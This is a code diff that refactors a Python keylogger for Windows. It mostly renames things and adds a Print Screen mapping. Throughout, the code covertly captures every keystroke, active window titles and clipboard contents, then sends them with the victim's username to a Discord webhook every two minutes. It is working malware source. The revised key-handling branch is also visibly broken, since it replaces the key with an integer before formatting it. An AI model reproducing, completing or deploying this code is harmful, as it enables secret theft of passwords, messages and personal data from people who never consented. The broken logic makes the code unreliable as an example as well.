@@ -1,20 +1,20 @@
 import os
+import unicodedata
 from threading import Timer
 from datetime import datetime
-from discord_webhook import DiscordWebhook, DiscordEmbed  # type: ignore
+from discord_webhook import DiscordWebhook, DiscordEmbed
 from pynput.keyboard import Listener, Key
+from dotenv import load_dotenv
 import pyperclip
 import keyboard
-import unicodedata
-from dotenv import load_dotenv
 import win32gui
 
 load_dotenv()
 
 current_window = None
-SEND_REPORT_EVERY = 120
-WEBHOOK = os.getenv("WEBHOOK_URL")
-special_keys = {
+REPORT_INTERVAL = 120
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+SPECIAL_KEYS = {
     Key.alt_l: "",
     Key.alt_r: "",
     Key.backspace: " [Backspace] ",
@@ -46,6 +46,7 @@ special_keys = {
     Key.page_down: "",
     Key.page_up: "",
     Key.pause: "",
+    Key.print_screen : " [Print Screen] ",
     Key.right: " [Right] ",
     Key.scroll_lock: "",
     Key.shift_l: "",
@@ -61,16 +62,16 @@ special_keys = {
     Key.media_play_pause: " [Play/Pause] "
 }
 
-class Keylogger:
+class Keylogger_KY8:
     def __init__(self, interval, report_method="webhook"):
         now = datetime.now()
         self.interval = interval
         self.report_method = report_method
         self.log = ""
-        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
-        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.start_time = now.strftime('%d/%m/%Y %H:%M')
+        self.end_time = now.strftime('%d/%m/%Y %H:%M')
         self.username = os.getlogin()
-        keyboard.add_hotkey("ctrl+v", self.clipboard, suppress=False)
+        keyboard.add_hotkey("ctrl+v", self.copy_clipboard, suppress=False)
 
     def get_active_window(self):
         try:
@@ -85,38 +86,40 @@ class Keylogger:
             current_window = new_window
             self.log += f"\n{"=" * 50}\nWindow title: {current_window}\n"
 
-    def callback(self, key):
+    def key_handler(self, key):
         self.log_window_change()
         try:
             key = key.char
             unicodedata.name(key)
-        except AttributeError:
-            if key in special_keys:
-                key = special_keys[key]
+        except (AttributeError, ValueError):
+            if key in SPECIAL_KEYS:
+                key = SPECIAL_KEYS[key]
             else:
-                key = str(key).replace("Key.", " [") + "]"
-        except (ValueError, AttributeError):
-            key = ""
+                key = str(key).find("Key.")
+                if key != -1:
+                    key = str(key).replace("Key.", " [") + "]"
+                else:
+                    key = ""
         self.log += key
 
-    def clipboard(self):
+    def copy_clipboard(self):
         self.log_window_change()
         self.log += f"\n[Clipboard]: {{\n{pyperclip.paste()}\n}}\n"
 
     def report_to_webhook(self):
-        webhook = DiscordWebhook(url=WEBHOOK)
+        webhook = DiscordWebhook(url=WEBHOOK_URL)
         if len(self.log) > 2000:
-                path = os.environ["temp"] + "\\report.txt"
+                path = os.environ["temp"] + "\\log.txt"
                 with open(path, 'w+') as file:
-                    file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                    file.write(f"Username :{self.username} | Time: {self.end_time}\n\n")
                     file.write(self.log)
                 with open(path, 'rb') as f:
-                    webhook.add_file(file=f.read(), filename='report.txt')
+                    webhook.add_file(file=f.read(), filename='log.txt')
                 webhook.execute()
                 os.remove(path) 
         else:
             if len(self.log) > 0:
-                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+                embed = DiscordEmbed(title=f"Username :{self.username} | Time: {self.end_time}", description=self.log)
                 webhook.add_embed(embed)    
         webhook.execute()
 
@@ -129,12 +132,12 @@ class Keylogger:
         timer.daemon = True
         timer.start()
 
-    def start(self):
-        self.start_dt = datetime.now()
-        with Listener(on_release=self.callback) as listener:
+    def run(self):
+        self.start_time = datetime.now()
+        with Listener(on_release=self.key_handler) as listener:
             self.report()
             listener.join()
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
-    keylogger.start()
+    keylogger = Keylogger_KY8(interval=REPORT_INTERVAL, report_method="webhook")    
+    keylogger.run()
